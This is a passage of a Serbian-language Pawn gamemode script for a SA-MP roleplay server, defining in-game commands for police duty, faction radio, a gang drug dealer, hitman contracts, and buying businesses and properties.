					DragedPlayerID[ playerid ] = -1;
					Draged[ igrac ] = -1;
				}
				else return SendErrorMessage( playerid, "Ne vucete tog igraca.");
			}
			else return SendErrorMessage( playerid, "Igrac nije pored vas." );
		}
	}
	else return SendErrorMessage( playerid, "Pogresan ID igraca." );
	return 1;
}

CMD:pokaziznacku( playerid, const params[] )
{
	if( GetFactionType( playerid ) != ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    if( PoliceDuty[ playerid ] == false )  return SendErrorMessage( playerid, "Niste na duznosti tako da nemate znacku kod sebe." );

	new id = PlayerInfo[ playerid ][ xClan ], igrac;
    if( sscanf( params, "u", igrac ) ) return SendUsageMessage( playerid, "/pokaziznacku [id]"); 
	if( igrac != IPI )
	{
		if( IsPlayerConnected( igrac ) )
		{
			if( IsPlayerNearPlayer( 3.0, playerid, igrac ) )
			{
                SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s podize ruku i pokazuje svoju znacku %s.", ImeIgraca( playerid ), ImeIgraca( igrac ) );
				SCMF( igrac, 0x00D900C8, "(ZNACKA - %s): {FFFFFF}%s {00D900}je {FFFFFF}%s.", org_info[ id ][ oPreFix ], ImeIgraca( playerid ), getOrgRank( playerid, id ) );
			    ApplyAnimation( playerid, "DEALER", "shop_pay", 4.1, 0, 0, 0, 0, 0 );
			}
			else SendErrorMessage( playerid, "Taj igrac nije blizu tebe !");
		}
	}
	return 1;
}

CMD:diler( playerid, const params[] )
{
	new bb = -1;
	for(new i; i < MAX_ORG; i++)
	{
		if( IsPlayerInRangeOfPoint( playerid, 3.0, org_info[ i ][ oDiler ][ 0 ], org_info[ i ][ oDiler ][ 1 ], org_info[ i ][ oDiler ][ 2 ] ) )
		{
			if( org_info[ i ][ oTip ] == ORG_TIP_BANDA ) bb = i;
		}
	}
	if(bb == -1) return SendErrorMessage(playerid, "Niste kod dilera.");

	new kol;
	if(sscanf(params, "i", kol)) return SendUsageMessage(playerid, "/diler (kolicina($%d gram))", org_info[ bb ][ oDilerCena ]);
	if(kol < 0 || kol > 100) return SendErrorMessage(playerid, "Kolicina ne moze biti manja od 0 i veca od 100g.");
	if(!org_info[bb][oDilerRadi]) return SendErrorMessage(playerid, "Diler trenutno ne radi.");
	if(org_info[bb][oSafeDrugAmmount] < 1) return SendErrorMessage(playerid, "Diler nema dostupne droge.");

	new imadostupno = org_info[bb][oSafeDrugAmmount];
	imadostupno -= kol;
	if(imadostupno < 0) return SendErrorMessage(playerid, "Diler nema dostupne droge.");

	if( (PlayerInfo[playerid][xTorba_Droga]+kol) > 10000 )
	{
		DajIgracuNovac(playerid, -kol*org_info[bb][oDilerCena]);
		PlayerInfo[playerid][xTorba_Droga] += kol;
		sql_user_update_integer(playerid, "xTorba_Droga", PlayerInfo[playerid][xTorba_Droga]);
		SendInfoMessage(playerid, "Kupili ste %dg droge od dilera.", kol);

		org_info[bb][oSafeDrugAmmount] -= kol;
		org_info[bb][oSafeMoney] += kol*org_info[bb][oDilerCena];

		new q[150];
		format(q, sizeof(q), "UPDATE `organizations` SET `safe_drug_amount` = '%d', `safe_money` = '%d' WHERE `org_id` = '%d'", org_info[bb][oSafeDrugAmmount], org_info[bb][oSafeMoney], org_info[ bb ][ oID ]);
		mysql_tquery(mSQL, q);

		format(q, sizeof(q), "(DILER - [%d])\nCena: {FFFFFF}$%d\n{64BC47}Dostupno: {FFFFFF}%dg\n{64BC47}Dostupan: {FFFFFF}%s", bb, org_info[ bb ][ oDilerCena ], org_info[ bb ][ oSafeDrugAmmount ], ((org_info[bb][oDilerRadi]) ? ("Da") : ("Ne")) );
		UpdateDynamic3DTextLabelText(org_info[bb][oDiler3D], 0x64BC47FF, q);
	}
	else SendErrorMessage( playerid, "Nema vise mesta za drogu." );
	return 1;
}

CMD:duty( playerid )
{
	if(GetFactionType( playerid ) == ORG_TIP_VLADINA)
	{
		new id = inOrgInt[ playerid ];
		if( id == -1 ) return SendErrorMessage( playerid, "Nisi u interijeru drzavne orge." );
		if( !IsPlayerInRangeOfPoint( playerid, 3.0, org_info[ id ][ oDutyPoint ][ 0 ], org_info[ id ][ oDutyPoint ][ 1 ], org_info[ id ][ oDutyPoint ][ 2 ] ) ) return SendErrorMessage( playerid, "Morate biti na pickupu za koriscenje ove komande." );
	    if( PlayerInfo[ playerid ][ xRank ] == 0 ) return SendErrorMessage( playerid, "Suspendovani ste." );

		if(!PoliceDuty[ playerid ])
		{
			PoliceDuty[ playerid ] = true;

			SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s %s uzima znacku i opremu iz ormarica.", getOrgRank( playerid, PlayerInfo[ playerid ][ xClan ] ), ImeIgraca( playerid ) );
			OrgPoruka( id, 0x2641FEAA, "(HQ): %s je sada na duznosti.", ImeIgraca( playerid ) );

			SMG_SetPlayerColor(playerid);
		}
		else
		{
		    PoliceDuty[ playerid ] = false;
			ResetPlayerWeapons( playerid );
			SetPlayerArmour( playerid, 0 );
			BrojLisica[ playerid ] = 0;
			SetPlayerArmour( playerid, 0 );
			SetPlayerHealth( playerid, 50+PlayerInfo[playerid][xSHealth] );
			SMG_SetPlayerSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
			SMG_SetPlayerColor( playerid ); 

			SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s vraca znacku i opremu u ormaric.", ImeIgraca( playerid ) );
			OrgPoruka( id, 0x2641FEAA, "(HQ): %s sada nije na duznosti.", ImeIgraca( playerid ) );
		}
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:computer( playerid, const params[] ) 
{
    new vehicleid = GetPlayerVehicleID( playerid );
	if( GetFactionType( playerid ) != ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");

	if( IsPlayerInRangeOfPoint( playerid, 2.0, 1372.4180,1088.8485,1626.4896) || IsPlayerInRangeOfPoint(playerid, 2.0, -24.1600,16.4334,2005.4120))
	{
		if(!PoliceComputer[playerid])
		{
			Police_TVTDControl( playerid, true );

			SelectTextDraw( playerid, 0x4282C0FF );

			PoliceComputer[playerid] = true;
			SendClientMessage( playerid, ZUTA, "(BP): Koristite {FFFFFF}[ /computer ] {FF0000}da bi ugasili racunar." );
 
			OrgPorukaLeader( PlayerInfo[ playerid ][ xClan ], 0xD2CFCFFF, "(HQ): %s se logovao na %s laptop.", ImeIgraca( playerid ), org_info[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ] );
			return 1;
		}
		else
		{
			Police_TVTDControl( playerid, false );

			CancelSelectTextDraw( playerid );
			PoliceComputer[playerid] = false;
 
			OrgPorukaLeader( PlayerInfo[ playerid ][ xClan ], 0xD2CFCFFF, "(HQ): %s se izlogovao sa %s laptop.", ImeIgraca( playerid ), org_info[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ] );
			return 1;
		}
	}
	else
	{
        if( VehicleInfo[ vehicleid ][ vUsage ] == ORGANIZACIJSKO_VOZILO && VehicleInfo[ vehicleid ][ vOrganization ] == PlayerInfo[ playerid ][ xClan ] )
		{
			if(!PoliceComputer[playerid])
			{
				Police_TVTDControl( playerid, true );

				SelectTextDraw( playerid, 0x4282C0FF );

				PoliceComputer[playerid] = true;
				SendClientMessage( playerid, ZUTA, "(BP): Koristite {FFFFFF}[ /computer ] {FF0000}da bi ugasili racunar." );
				return 1;
			}
			else
			{
				Police_TVTDControl( playerid, false );

				CancelSelectTextDraw( playerid );
				PoliceComputer[playerid] = false;
				return 1;
			}
		}
		else SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti u vozilu policije/racunar u stanici." );
	}
	return 1;
}

CMD:r( playerid, const params[] )
{
    if(gettime() < PlayerInfo[ playerid ][ xMute ] ) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
    if(PlayerInfo[ playerid ][ xZatvor ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete pisati dok ste u jailu / prisonu.");
	if(PlayerInfo[ playerid ][ xClan ] == 0 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	if(GetFactionType( playerid ) != ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

	new str[ 144 ];
	if(sscanf(params, "s[144]", str)) return SendUsageMessage( playerid, "/r [text]");

    for( new b = 0; b < sizeof( ZabranjeneReci ); b++)
	{
        if( strfind( str, ZabranjeneReci[ b ], true ) != -1 )
		{
       		AdminMsgForLevel(PlayerInfo[playerid][xAdmin], 0x808000AA, "#WARNING - /r: {FFFFFF}%s[%d] > %s", ImeIgraca( playerid ), playerid, str );
       		break;
        }
	}

	switch(PlayerInfo[ playerid ][ xRank ])
 	{
		case 1: OrgPoruka( PlayerInfo[ playerid ][ xClan ], 0xD2CFCFFF, "** [Radio] %s %s: {FFFFFF}%s{D2CFCF}. **", org_info[ PlayerInfo[ playerid ][ xClan ]][ oRank1 ], ImeIgraca( playerid ), str );
		case 2: OrgPoruka( PlayerInfo[ playerid ][ xClan ], 0xD2CFCFFF, "** [Radio] %s %s: {FFFFFF}%s{D2CFCF}. **", org_info[ PlayerInfo[ playerid ][ xClan ]][ oRank2 ], ImeIgraca( playerid ), str );
		case 3: OrgPoruka( PlayerInfo[ playerid ][ xClan ], 0xD2CFCFFF, "** [Radio] %s %s: {FFFFFF}%s{D2CFCF}. **", org_info[ PlayerInfo[ playerid ][ xClan ]][ oRank3 ], ImeIgraca( playerid ), str );
		case 4: OrgPoruka( PlayerInfo[ playerid ][ xClan ], 0xD2CFCFFF, "** [Radio] %s %s: {FFFFFF}%s{D2CFCF}. **", org_info[ PlayerInfo[ playerid ][ xClan ]][ oRank4 ], ImeIgraca( playerid ), str );
		case 5: OrgPoruka( PlayerInfo[ playerid ][ xClan ], 0xD2CFCFFF, "** [Radio] %s %s: {FFFFFF}%s{D2CFCF}. **", org_info[ PlayerInfo[ playerid ][ xClan ]][ oRank5 ], ImeIgraca( playerid ), str );
		case 6: OrgPoruka( PlayerInfo[ playerid ][ xClan ], 0xD2CFCFFF, "** [Radio] %s %s: {FFFFFF}%s{D2CFCF}. **", org_info[ PlayerInfo[ playerid ][ xClan ]][ oRank6 ], ImeIgraca( playerid ), str );
		default: OrgPoruka( PlayerInfo[ playerid ][ xClan ], 0xD2CFCFFF, "** [Radio] noRank? %s: {FFFFFF}%s{D2CFCF}. **", org_info[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ], ImeIgraca( playerid ), str );
	}
	return 1;
}

CMD:d( playerid, params[] ) {
	if(gettime() < PlayerInfo[ playerid ][ xMute ] ) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
	if(GetFactionType( playerid ) != ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    if(!PoliceDuty[ playerid ]) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti.");

	new string[ 144 ];
	if(sscanf(params, "s[144]", string)) return SendUsageMessage( playerid, "/d [text]");

    for( new b = 0; b < sizeof( ZabranjeneReci ); b++)
	{
        if( strfind( string, ZabranjeneReci[ b ], true ) != -1 )
		{
       		AdminMsgForLevel(PlayerInfo[playerid][xAdmin], 0x808000AA, "#WARNING - /d: {FFFFFF}%s[%d] > %s", ImeIgraca( playerid ), playerid, string );
       		break;
        }
	}

    for(new id = 1; id < MAX_ORG; id++) {
		if(org_info[ id ][ oTip ] == ORG_TIP_VLADINA) {
			switch(PlayerInfo[ playerid ][ xRank ])
		 	{
				case 1: OrgPoruka(id, 0xe6ffe6FF, "** [LAW] %s %s: {FFFFFF}%s{e6ffe6}.", org_info[ PlayerInfo[ playerid ][ xClan ]][ oRank1 ], ImeIgraca( playerid ), string );
				case 2: OrgPoruka(id, 0xe6ffe6FF, "** [LAW] %s %s: {FFFFFF}%s{e6ffe6}.", org_info[ PlayerInfo[ playerid ][ xClan ]][ oRank2 ], ImeIgraca( playerid ), string );
				case 3: OrgPoruka(id, 0xe6ffe6FF, "** [LAW] %s %s: {FFFFFF}%s{e6ffe6}.", org_info[ PlayerInfo[ playerid ][ xClan ]][ oRank3 ], ImeIgraca( playerid ), string );
				case 4: OrgPoruka(id, 0xe6ffe6FF, "** [LAW] %s %s: {FFFFFF}%s{e6ffe6}.", org_info[ PlayerInfo[ playerid ][ xClan ]][ oRank4 ], ImeIgraca( playerid ), string );
				case 5: OrgPoruka(id, 0xe6ffe6FF, "** [LAW] %s %s: {FFFFFF}%s{e6ffe6}.", org_info[ PlayerInfo[ playerid ][ xClan ]][ oRank5 ], ImeIgraca( playerid ), string );
				case 6: OrgPoruka(id, 0xe6ffe6FF, "** [LAW] %s %s: {FFFFFF}%s{e6ffe6}.", org_info[ PlayerInfo[ playerid ][ xClan ]][ oRank6 ], ImeIgraca( playerid ), string );
         	}
		}
	}
	return 1;
}

CMD:portable( playerid )
{
	if( GetFactionType( playerid ) != ORG_TIP_HITMAN ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

    ShowPlayerDialog( playerid, dialog_PORTABLE, DIALOG_STYLE_LIST, D_NASLOV,
																				"{4282C0}(1). {FFFFFF}Kontrakti\n\
																				{4282C0}(2). {FFFFFF}Daj metu\n\
																				{4282C0}(3). {FFFFFF}Rankovi\n\
																				{4282C0}(4). {FFFFFF}Naruci", "Potvrdi", "Odustani" );
	return 1;
}

CMD:find( playerid, const params[] )
{
	if( CheckpointStatus[ playerid ] != 0 ) return SendErrorMessage( playerid, "Vec imas aktiviran marker tako da ne mozes ovo koristiti." );

	if( IsPlayerConnected( playerid ) )
	{
	    if( GetFactionType( playerid ) == ORG_TIP_HITMAN || GetFactionType( playerid ) == ORG_TIP_VLADINA )
		{
		    if( CheckpointStatus[ playerid ] != 0 ) return SendErrorMessage( playerid, "Vec imas jedan upaljen CP, prvo ga ugasi [ /gpsoff ]." );
		    if( GetFactionType(playerid) == ORG_TIP_VLADINA && !PoliceDuty[ playerid ] ) return SendErrorMessage(playerid, "Niste na duznosti.");

			if( SearchNadji[ playerid ] != -1 )
			{
			    SearchNadji[ playerid ] = -1;
			    SMG_DisablePlayerCheckpoint( playerid );
			}
			else
			{
				new ID;
				if( sscanf( params, "u", ID ) ) return SendUsageMessage( playerid, "/find [id]");

	        	if( ID == IPI ) return SendErrorMessage(playerid, "Pogresan ID.");
				if( PlayerInfo[ ID ][ xAdmin ] > 0 ) return SendErrorMessage(playerid, "Ne mozes naci Admina." );
				if( PlayerInfo[ ID ][ xGamemaster ] > 0 ) return SendErrorMessage(playerid, "Ne mozes naci Gamemastera." );
				if( PlayerInfo[ ID ][ xSpecAdmin ] > 0) return SendErrorMessage(playerid, "Ne mozes naci Spec Admina");

				new Float:X, Float:Y, Float:Z;
				GetPlayerPos( ID, X, Y, Z );
				SMG_SetPlayerCheckpoint( playerid, X, Y, Z, 6 );
				SearchNadji[ playerid ] = ID;
			}
		}
		else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	}
	return 1;
}

CMD:contract( playerid, const params[] )
{
    if( IsPlayerConnected( playerid ) )
	{
        new ID, amount;
		if( sscanf(params, "ui", ID, amount)) return SendUsageMessage( playerid, "/contract [id] [novac]");
        if( ID == IPI ) return SendErrorMessage(playerid, "Pogresan ID.");

        if( amount < 1000 || amount > 200000 ) return SendErrorMessage( playerid, "Cena mete mora biti minimum $1.000, ili maksimum $200.000.");
        if( amount > PlayerInfo[ playerid ][ xNovac ] ) return SendErrorMessage( playerid, "Nemate toliko novca sa sobom.");
		if( PlayerInfo[ playerid ][ xLevel ] < 5 ) return SendErrorMessage( playerid, "Morate biti level 5." );
		if( PlayerInfo[ ID ][ xLevel ] < 5 ) return SendErrorMessage( playerid, "Igrac mora biti level 5." );
		if( PlayerInfo[ ID ][ xAdmin ] >= 1 || PlayerInfo[ ID ][ xGamemaster ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete to uraditi na Staff." );

		if( IsPlayerConnected( ID ) )
		{
            if( ID != IPI )
			{
                if( org_info[ PlayerInfo[ ID ][ xClan ] ][ oTip ] == ORG_TIP_HITMAN ) return SendErrorMessage( playerid, "Ne mozete naruciti ubistvo clanova agencije.");
			    if( ID == playerid ) return SendErrorMessage( playerid, "Ne mozete naruciti svoje ubistvo.");

                if( amount > 0 && PlayerInfo[ playerid ][ xNovac ] >= amount )
				{
                    DajIgracuNovac( playerid, -amount );
                    PlayerInfo[ ID ][ xHitmenCena ] += amount;
                    sql_user_update_integer( ID, "hitman_price", PlayerInfo[ ID ][ xHitmenCena ] );

                    SCMF(playerid, 0xFFFF00FF, "(CONTRACT): Narucili ste ubistvo {FFFFFF}'%s-a' {FFFF00}za {FFFFFF}($%d).", ImeIgraca( ID ), amount );
                    PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0 );

                    for( new id = 1; id < MAX_ORG; id++)
					{
		    			if( org_info[ id ][ oTip ] == ORG_TIP_HITMAN )
						{ 
                    		OrgPoruka( id, ZUTA, "*** %s je narucio ubistvo '%s-a' za ($%d).", ImeIgraca( playerid ), ImeIgraca( ID ), amount );
						}
					}
                }
                else SendErrorMessage( playerid, "Nepravilan iznos transakcije.");
            }
        }
        else SendErrorMessage( playerid, "Pogresan ID." );
    }
    return 1;
}

CMD:members( playerid )
{
    new brojka = 0, string[ 128 ] = " ", OrgID;

	if( PlayerInfo[ playerid ][ xClan ] != 0 ) OrgID = PlayerInfo[ playerid ][ xClan ];
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu!");

	foreach( new i : Player)
	{
		if( PlayerLogged[ i ] )
		{
            string = " ";
			if( PlayerInfo[ i ][ xLider ] == OrgID )
			{
				format( string, sizeof( string ), "- (( ID:%d )) %s, (LEADER)\n", i, ImeIgraca( i ) );
				brojka++;
				if( brojka == 1 ) SendClientMessage( playerid, 0x808000AA, "*** ONLINE MEMBERS ***" );
			}
			else if( PlayerInfo[ i ][ xClan ] == OrgID )
			{
    			if( GetFactionType( playerid ) == ORG_TIP_VLADINA )
				{
					if( PlayerInfo[ i ][ xRank ] != 0 )
					{
					 	format( string, sizeof( string), "- (( ID:%d )) %s, %s\n",i , ImeIgraca( i ), getOrgRank( i, PlayerInfo[ i ][ xClan ] ) );
					}
					else
					{
						format( string, sizeof( string ), "- (( ID:%d )) [SUSPENDED] %s, %s\n",i , ImeIgraca( i ), getOrgRank( i, PlayerInfo[ i ][ xClan ] ) );
					}
				}
				else format( string, sizeof( string ), "- (( ID:%d )) %s, %s\n",i , ImeIgraca( i ), getOrgRank( i, PlayerInfo[ i ][ xClan ] ) );

				brojka++;
				if( brojka == 1 ) SendClientMessage( playerid, 0x808000AA, "*** ONLINE MEMBERS ***" );
			}
			if( strlen( string ) > 1 ) SendClientMessage( playerid, 0xF5DEB3AA, string );
		}
	}
	if( brojka == 0 ) return SendErrorMessage(playerid, "Nema online clanova!");
	return 1;
}
alias:members( "clanovi" );

CMD:f( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si u jailu." );
    if( gettime() < PlayerInfo[ playerid ][ xMute ] ) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
    if( PlayerCuffed[ playerid ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes koristiti komandu kad si cuffovan ili tazovan.");
	if( PlayerInfo[ playerid ][ xZatvor ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete pisati dok ste u jailu / prisonu.");

	new str[ 144 ];
	if( sscanf(params, "s[128]", str)) return SendUsageMessage( playerid, "/f [text]");

    for( new b = 0; b < sizeof( ZabranjeneReci ); b++)
	{
        if( strfind( str, ZabranjeneReci[ b ], true ) != -1 )
		{ 
       		AdminMsgForLevel(PlayerInfo[playerid][xAdmin], 0x808000AA, "#WARNING - /f: {FFFFFF}%s[%d] > %s", ImeIgraca( playerid ), playerid, str );
       		break;
        }
	}

	if( PlayerInfo[ playerid ][ xLider ] > 0 || PlayerInfo[ playerid ][ xClan ] > 0)
	{
	    switch(PlayerInfo[playerid][xRank])
	    {
			case 1: OrgPoruka( PlayerInfo[ playerid ][ xClan ], 0x00EAF2FF, "[%s] %s %s: {FFFFFF}%s", org_info[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ], org_info[ PlayerInfo[ playerid ][ xClan ]][ oRank1 ], ImeIgraca( playerid ), str);
		    case 2: OrgPoruka( PlayerInfo[ playerid ][ xClan ], 0x00EAF2FF, "[%s] %s %s: {FFFFFF}%s", org_info[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ], org_info[ PlayerInfo[ playerid ][ xClan ]][ oRank2 ], ImeIgraca( playerid ), str);
		    case 3: OrgPoruka( PlayerInfo[ playerid ][ xClan ], 0x00EAF2FF, "[%s] %s %s: {FFFFFF}%s", org_info[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ], org_info[ PlayerInfo[ playerid ][ xClan ]][ oRank3 ], ImeIgraca( playerid ), str);
		    case 4: OrgPoruka( PlayerInfo[ playerid ][ xClan ], 0x00EAF2FF, "[%s] %s %s: {FFFFFF}%s", org_info[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ], org_info[ PlayerInfo[ playerid ][ xClan ]][ oRank4 ], ImeIgraca( playerid ), str);
		    case 5: OrgPoruka( PlayerInfo[ playerid ][ xClan ], 0x00EAF2FF, "[%s] %s %s: {FFFFFF}%s", org_info[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ], org_info[ PlayerInfo[ playerid ][ xClan ]][ oRank5 ], ImeIgraca( playerid ), str);
		    case 6: OrgPoruka( PlayerInfo[ playerid ][ xClan ], 0x00EAF2FF, "[%s] %s %s: {FFFFFF}%s", org_info[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ], org_info[ PlayerInfo[ playerid ][ xClan ]][ oRank6 ], ImeIgraca( playerid ), str);
			default: OrgPoruka( PlayerInfo[ playerid ][ xClan ], 0x00EAF2FF, "[%s] %s %s: {FFFFFF}%s", org_info[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ], org_info[ PlayerInfo[ playerid ][ xClan ]][ oRank1 ], ImeIgraca( playerid ), str);
		}
	}
    else SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

// Firma System
CMD:kupifirmu( playerid )
{
	if( PlayerInfo[ playerid ][ xLider ] > 0 )
	{
		ShowPlayerDialog( playerid, dialog_LEADERBUYBIZZ, DIALOG_STYLE_MSGBOX, D_NASLOV, "Kao lider imate dve opcije kupovine firme:\n- 1. Kupiti firmu za sebe\n- 2. Kupiti firmu za organizaciju", "Za sebe", "Za org" );
		return 1;
	}

	new id = GetNearestBussines( playerid );
	if( id == -1 ) return SendErrorMessage( playerid, "Niste blizu firme." );
	if( BusinessInfo[ id ][ bOwner_sqlID ] != -1 || BusinessInfo[ id ][ bPrice ] == 0 || BusinessInfo[ id ][ bOwnerOrg ] != -1 || BusinessInfo[id][bOnAuction] ) return SendErrorMessage( playerid, "Ova firma se ne prodaje ili je na aukciji!");
	if( PlayerInfo[ playerid ][ xFirmaID ] != -1 ) return SendErrorMessage( playerid, "Vec posedujes firmu!");
	if( PlayerInfo[ playerid ][ xNovac ] < BusinessInfo[ id ][ bPrice ] ) return SendErrorMessage( playerid, "Nemate dovoljno novca za kupovinu firme!");
    if( PlayerInfo[ playerid ][ xLevel ] < BusinessInfo[ id ][ bLevel ] ) return SCMF( playerid, CRVENA, "Morate biti level %d+ da bi ste kupili firmu.", BusinessInfo[ id ][ bLevel ] );

	PlayerInfo[ playerid ][ xFirmaID ] = id;
	PlayerInfo[ playerid ][ xBussinesSqlID ] = BusinessInfo[ id ][ b_ID ];
	DajIgracuNovac( playerid, -BusinessInfo[ id ][bPrice] );
	BusinessInfo[ id ][ bLocked ] = 0;
	BusinessInfo[ id ][ bNeaktivnost ] = 0;
	BusinessInfo[ id ][ bFacture ] = 100;
	BusinessInfo[ id ][ bOwner_sqlID ] = PlayerInfo[ playerid ][ xID ];
	strmid( BusinessInfo[ id ][ bOwner ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 255);
	Bussines_Refresh( id );

	new q[ 180 ];
	mysql_format( mSQL, q, sizeof(q), "UPDATE `bussines` SET `b_owner_sqlID` = '%d', `bOwner` = '%s', `b_neaktivnost` = '%d', `b_facture` = '%d' WHERE `bussines_id` = '%d'",
										BusinessInfo[ id ][ bOwner_sqlID ], BusinessInfo[ id ][ bOwner ], BusinessInfo[ id ][ bNeaktivnost ], BusinessInfo[ id ][ bFacture ], BusinessInfo[ id ][ b_ID ] );
	mysql_tquery( mSQL, q );

	if(questInfo[playerid][qt_EasyQuest][7] == false) {
    	questInfo[playerid][qt_EasyQuest][7] = true;
    	sql_UpdateQuest(playerid);

		KillTimer(QuestTimer[playerid]);
		quest_CreateTDs(playerid, false);

		quest_CreateTDs(playerid, true);
		PlayerTextDrawSetString(playerid, quest_pTD[playerid][4], "CESTITAMO, RIJESILI STE ~p~ZADATAK BR.8");
		PlayerTextDrawSetString(playerid, quest_pTD[playerid][5], "Nagradu mozete preuzeti~n~~p~(/zadaci pocetni)");

		QuestTimer[playerid] = SetPlayerTimerEx(playerid, "questDone", 10000, 10000, "ii", playerid, 1);
    }

	sql_user_update_integer( playerid, "bussines_id", PlayerInfo[ playerid ][ xBussinesSqlID ] );
	SendClientMessage( playerid, 0xFF4500FF, "(FIRMA): Kupili ste firmu, cestitamo." );
	SendClientMessage( playerid, 0xFF4500FF, "(FIRMA): UKOLIKO VAM FAKTURE DODJU NA 0, FIRMA CE SE PRODATI AUTOMATSKI." );
	return 1;
}

CMD:firma( playerid )
{
    if( PlayerInfo[ playerid ][ xFirmaID ] == -1 ) return SendErrorMessage( playerid, "Ne posedujete firmu!" );
	if( strcmp( ImeIgraca( playerid ), BusinessInfo[ PlayerInfo[ playerid ][ xFirmaID ] ][ bOwner ], true) == 0 )
	{
		ShowPlayerDialog( playerid, dialog_FIRMA, DIALOG_STYLE_LIST, D_NASLOV,
																				"{4282C0}(1). {FFFFFF}Informacije\n\
																				{4282C0}(2). {FFFFFF}Promeni ime\n\
																				{4282C0}(3). {FFFFFF}Zakljucaj/Otkljucaj firmu\n\
																				{4282C0}(4). {FFFFFF}Podigni novac\n\
																				{4282C0}(5). {FFFFFF}Ostavi novac\n\
																				{4282C0}(6). {F81414}Prodaj drzavi\n\
																				{4282C0}(7). {F81414}Prodaj igracu\n\
																				{4282C0}(8). {FFFFFF}Ubaci fakture", "Potvrdi", "Odustani" );
	}
	else
	{
		SendClientMessage( playerid, ANTICHEAT, "(ANTICHEAT): Ova firma nije u vasem vlasnistvu, obratite se na forumu ako mislite je greska." );
	}
	return 1;
}

//Imovina
CMD:imovina( playerid )
{
	if( PlayerInfo[ playerid ][ xProperty ][ 0 ] == -1 && PlayerInfo[ playerid ][ xProperty ][ 1 ] == -1 && PlayerInfo[ playerid ][ xProperty ][ 2 ] == -1 ) return SendErrorMessage( playerid, "Nemate nista od imovine!");

	new str[200];
	format(str, sizeof(str),
							"{FFFFFF}Vrsta\t{FFFFFF}ID\n\
							{4282C0}(1). {FFFFFF}%s\t{FFFFFF}[%d]\n\
							{4282C0}(2). {FFFFFF}%s\t{FFFFFF}[%d]\n\
							{4282C0}(3). {FFFFFF}%s\t{FFFFFF}[%d]",
			((PlayerInfo[ playerid ][ xProperty ][ 0 ] == -1) ? ("Prazno") : (GetPropertyAName(PlayerInfo[ playerid ][ xProperty ][ 0 ]))), PlayerInfo[ playerid ][ xProperty ][ 0 ],
			((PlayerInfo[ playerid ][ xProperty ][ 1 ] == -1) ? ("Prazno") : (GetPropertyAName(PlayerInfo[ playerid ][ xProperty ][ 1 ]))), PlayerInfo[ playerid ][ xProperty ][ 1 ],
			((PlayerInfo[ playerid ][ xProperty ][ 2 ] == -1) ? ("Prazno") : (GetPropertyAName(PlayerInfo[ playerid ][ xProperty ][ 2 ]))), PlayerInfo[ playerid ][ xProperty ][ 2 ]);

	ShowPlayerDialog( playerid, dialog_PROPERTYLIST, DIALOG_STYLE_TABLIST_HEADERS, D_NASLOV, str, "Potvrdi", "Odustani" );
	return 1;
}

CMD:kupiimovinu( playerid )
{
	new id = GetNearestProperty(playerid);
    if( id == -1 ) return SendErrorMessage( playerid, "Nema imovine u vasoj blizini!" );
    if( PlayerInfo[ playerid ][ xProperty ][ 0 ] != -1 && PlayerInfo[ playerid ][ xProperty ][ 1 ] != -1 && PlayerInfo[ playerid ][ xProperty ][ 2 ] != -1 ) return SendErrorMessage( playerid, "Vec posedujes 3 kuce/stana/vikendice!");
 	if( PlayerInfo[ playerid ][ xNovac ] < II[ id ][ iPrice ] ) return SendErrorMessage( playerid, "Nemate dovoljno novca!" );
	if( II[ id ][ iOwned ] != 0 ) return SCMF( playerid, CRVENA, "(IMOVINA): Ova %s nije na prodaju.", GetPropertyAName( id ) );
	if( II[ id ][ iOnAuction ] ) return SCMF( playerid, CRVENA, "(IMOVINA): Ova %s je na aukciji.", GetPropertyAName( id ) );

    if( PlayerInfo[ playerid ][ xLevel ] < II[ id ][ iLevel ] ) return SCMF( playerid, CRVENA, "(IMOVINA): Da bi ste kupili ovu imovinu morate biti level %d+.", II[ id ][ iLevel ] );

	if( PlayerInfo[ playerid ][ xProperty ][ 0 ] == -1 ) 
	{ 
		PlayerInfo[ playerid ][ xProperty ][ 0 ] = id;
		PlayerInfo[ playerid ][ xPropertySqlID ][ 0 ] = II[id][iSQLID];
	}
